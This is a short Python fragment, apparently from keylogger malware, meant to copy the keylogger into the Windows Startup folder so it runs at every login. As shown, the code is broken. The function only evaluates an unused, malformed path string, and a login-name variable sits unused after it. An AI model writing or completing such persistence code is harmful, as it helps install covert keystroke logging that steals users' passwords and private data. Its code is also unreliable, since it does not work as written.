import os

def add_to_startup(file):
    # Moving keylogger to shell:startup
    try:
        f"C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
    except:
        print("[*] Specified directory doesn't exist")

user = os.getlogin()

print()